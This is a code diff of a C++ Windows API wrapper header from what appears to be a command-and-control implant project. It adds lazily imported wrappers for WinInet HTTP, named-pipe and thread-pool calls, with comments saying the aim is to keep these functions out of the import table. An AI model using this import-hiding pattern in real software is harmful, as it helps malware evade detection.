@@ -31,6 +31,9 @@ Also - a nice resource for finding what f*cking dll a function uses: https://mal
 #include <netioapi.h>//NET_IF_STATUS
 #include "_debug/debug.h"
 
+//wininet
+#include <wininet.h>
+
 //* NO PRAGMA's, this includes all these funcs in the IAT. Use EnsureMOduleLoaded instead
 //#pragma comment(lib, "iphlpapi.lib")
 //#pragma comment(lib, "ws2_32.lib")
@@ -87,11 +90,6 @@ namespace WinApi {
     }
 
     //SYSTEM / UTILITY
-    inline BOOL CloseHandle(HANDLE hObject) {
-        DEBUG_LOG("[WinApi::CloseHandle] Calling CloseHandle");
-        return LI_FN(CloseHandle)(hObject);
-    }
-
     inline DWORD GetLastError() {
         DEBUG_LOG("[WinApi::GetLastError] Calling GetLastError");
         return LI_FN(GetLastError)();
@@ -162,11 +160,160 @@ namespace WinApi {
         return LI_FN(GetNameInfoW)(pSockaddr, SockaddrLength, pNodeBuffer, NodeBufferSize, pServiceBuffer, ServiceBufferSize, Flags);
     }
 
+    // misc
+    inline DWORD FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments) {
+        DEBUG_LOG("[WinApi::FormatMessageA] Calling FormatMessageA");
+        return LI_FN(FormatMessageA)(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments);
+    }
+
+    inline HLOCAL LocalFree(HLOCAL hMem) {
+        DEBUG_LOG("[WinApi::LocalFree] Calling LocalFree");
+        return LI_FN(LocalFree)(hMem);
+    }
+    inline BOOL SetNamedPipeHandleState(HANDLE hNamedPipe, LPDWORD lpMode, LPDWORD lpMaxCollectionCount, LPDWORD lpCollectDataTimeout) {
+        DEBUG_LOG("[WinApi::SetNamedPipeHandleState] Calling SetNamedPipeHandleState");
+        return LI_FN(SetNamedPipeHandleState)(hNamedPipe, lpMode, lpMaxCollectionCount, lpCollectDataTimeout);
+    }
+
+    // --- Thread Pool API ---
+
+    inline PTP_WORK CreateThreadpoolWork(PTP_WORK_CALLBACK pfnwk, PVOID pv, PTP_CALLBACK_ENVIRON pcbe) {
+        DEBUG_LOG("[WinApi::CreateThreadpoolWork] Calling CreateThreadpoolWork");
+        //return LI_FN(CreateThreadpoolWork)(pfnwk, pv, pcbe);
+        //note - forwarding, crashes withouth forward. For now, just calling native func
+        return ::CreateThreadpoolWork(pfnwk, pv, pcbe);
+
+    }
+
+    inline VOID SubmitThreadpoolWork(PTP_WORK pwk) {
+        DEBUG_LOG("[WinApi::SubmitThreadpoolWork] Calling SubmitThreadpoolWork");
+        //return LI_FN(SubmitThreadpoolWork)(pwk);
+        // note - forwarding, crashes withouth forward. For now, just calling native func
+        return ::SubmitThreadpoolWork(pwk);
+
+    }
+
+    inline VOID CloseThreadpoolWork(PTP_WORK pwk) {
+        DEBUG_LOG("[WinApi::CloseThreadpoolWork] Calling CloseThreadpoolWork");
+        //return LI_FN(CloseThreadpoolWork)(pwk);
+        //  note - forwarding, crashes withouth forward. For now, just calling native func
+        return ::CloseThreadpoolWork(pwk);
+
+    }
+
+    // --- Synchronization & Events ---
+
+    inline HANDLE CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName) {
+        DEBUG_LOG("[WinApi::CreateEventW] Calling CreateEventW");
+        // note - forwarding, crashes withouth forward. For now, just calling native func
+        //return LI_FN(CreateEventW)(lpEventAttributes, bManualReset, bInitialState, lpName);
+        return ::CreateEventW(lpEventAttributes, bManualReset, bInitialState, lpName);
+    }
+
+    inline BOOL SetEvent(HANDLE hEvent) {
+        DEBUG_LOG("[WinApi::SetEvent] Calling SetEvent");
+        // note - forwarding, crashes withouth forward. For now, just calling native func
+        //return LI_FN(SetEvent)(hEvent);
+        return ::SetEvent(hEvent);
+    }
+
+    inline DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
+        DEBUG_LOG("[WinApi::WaitForSingleObject] Calling WaitForSingleObject");
+        // note - forwarding, crashes withouth forward. For now, just calling native func
+        //return LI_FN(WaitForSingleObject)(hHandle, dwMilliseconds);
+        return ::WaitForSingleObject(hHandle, dwMilliseconds);
+    }
+
+    inline DWORD WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) {
+        DEBUG_LOG("[WinApi::WaitForMultipleObjects] Calling WaitForMultipleObjects");
+        // note - forwarding, crashes withouth forward. For now, just calling native func
+        //return LI_FN(WaitForMultipleObjects)(nCount, lpHandles, bWaitAll, dwMilliseconds);
+        return ::WaitForMultipleObjects(nCount, lpHandles, bWaitAll, dwMilliseconds);
+    }
+
+    // --- Handle Management ---
+
+    inline BOOL CloseHandle(HANDLE hObject) {
+        DEBUG_LOG("[WinApi::CloseHandle] Calling CloseHandle");
+        // note - forwarding, crashes withouth forward. For now, just calling native func
+        //return LI_FN(CloseHandle)(hObject);
+        return ::CloseHandle(hObject);
+    }
+    inline HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+        DEBUG_LOG("[WinApi::CreateThread] Calling CreateThread");
+        return LI_FN(CreateThread)(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
+    }
+
+    //WINIET:
+    // --- WinInet Initialization & Connection ---
+
+    inline HINTERNET InternetOpenW(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags) {
+        DEBUG_LOG("[WinApi::InternetOpenW] Calling InternetOpenW");
+        EnsureModuleLoaded("wininet.dll");
+        return LI_FN(InternetOpenW)(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
+    }
+
+    inline HINTERNET InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
+        DEBUG_LOG("[WinApi::InternetConnectW] Calling InternetConnectW");
+        EnsureModuleLoaded("wininet.dll");
+        return LI_FN(InternetConnectW)(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
+    }
+
+    // --- HTTP Request Management ---
+
+    inline HINTERNET HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) {
+        DEBUG_LOG("[WinApi::HttpOpenRequestW] Calling HttpOpenRequestW");
+        EnsureModuleLoaded("wininet.dll");
+        return LI_FN(HttpOpenRequestW)(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
+    }
+
+    inline BOOL HttpAddRequestHeadersW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers) {
+        DEBUG_LOG("[WinApi::HttpAddRequestHeadersW] Calling HttpAddRequestHeadersW");
+        EnsureModuleLoaded("wininet.dll");
+        return LI_FN(HttpAddRequestHeadersW)(hRequest, lpszHeaders, dwHeadersLength, dwModifiers);
+    }
+
+    inline BOOL HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
+        DEBUG_LOG("[WinApi::HttpSendRequestW] Calling HttpSendRequestW");
+        EnsureModuleLoaded("wininet.dll");
+        return LI_FN(HttpSendRequestW)(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
+    }
+
+    // --- Data Retrieval & Cleanup ---
+
+    inline BOOL InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
+        DEBUG_LOG("[WinApi::InternetReadFile] Calling InternetReadFile");
+        EnsureModuleLoaded("wininet.dll");
+        return LI_FN(InternetReadFile)(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
+    }
+
+    inline BOOL InternetCloseHandle(HINTERNET hInternet) {
+        DEBUG_LOG("[WinApi::InternetCloseHandle] Calling InternetCloseHandle");
+        EnsureModuleLoaded("wininet.dll");
+        return LI_FN(InternetCloseHandle)(hInternet);
+    }
+
+    inline HANDLE CreateNamedPipeW(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
+        DEBUG_LOG("[WinApi::CreateNamedPipeW] Calling CreateNamedPipeW");
+        return LI_FN(CreateNamedPipeW)(lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes);
+    }
+
+    inline BOOL ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
+        DEBUG_LOG("[WinApi::ConnectNamedPipe] Calling ConnectNamedPipe");
+        return LI_FN(ConnectNamedPipe)(hNamedPipe, lpOverlapped);
+    }
+
+
+
     //modules to do/check:
     //[X]ls
     //[X] strategy
     //[ ] discover
     //the rest of the project
+    //[X] c2.cpp
+    //[x]commandtree.cpp
+    //wininiet/http.cpp
+
 
     //// Wrapper for networking with encrypted strings
     //inline HANDLE HttpOpen(LPCSTR agent) {
